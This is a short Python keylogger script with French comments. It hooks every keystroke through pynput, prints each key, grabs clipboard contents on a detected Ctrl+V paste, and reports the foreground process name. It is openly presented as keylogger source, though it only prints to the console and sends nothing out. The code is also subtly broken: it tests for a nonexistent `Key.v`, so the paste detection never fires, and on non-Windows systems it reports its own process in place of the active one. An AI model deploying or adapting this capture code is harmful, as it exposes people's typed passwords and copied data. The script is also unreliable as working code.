import sys
import pyperclip
import psutil
from pynput import keyboard

current_command = False

def get_current_process():
    """
    Récupère le nom du processus actif (Windows & Linux)
    """
    try:
        active_process = None
        if sys.platform == "win32":
            import win32gui
            import win32process
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            active_process = psutil.Process(pid).name()
        else:
            active_process = psutil.Process(psutil.Process().pid).name()

        return active_process
    except Exception as e:
        return f"Erreur : {e}"

def on_press(key):
    global current_command

    try:
        if key == keyboard.Key.ctrl_l:  # Détecte Ctrl (gauche)
            current_command = True
            print("[CTRL] ", end="", flush=True)

        elif key == keyboard.Key.v and current_command:  # Détecte Ctrl + V
            current_command = False
            pasted_data = pyperclip.paste()
            print(f"[PASTE] - {pasted_data}")

        elif key == keyboard.Key.esc:  # Quitte avec Échap
            print("\nExiting KeyLogger")
            return False
        else:
            print(f"[{key.char}]", end="", flush=True)

    except AttributeError:  # Touche spéciale (non alphanumérique)
        print(f"[{key}]", end="", flush=True)

def main():
    print(f"Processus actif : {get_current_process()}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
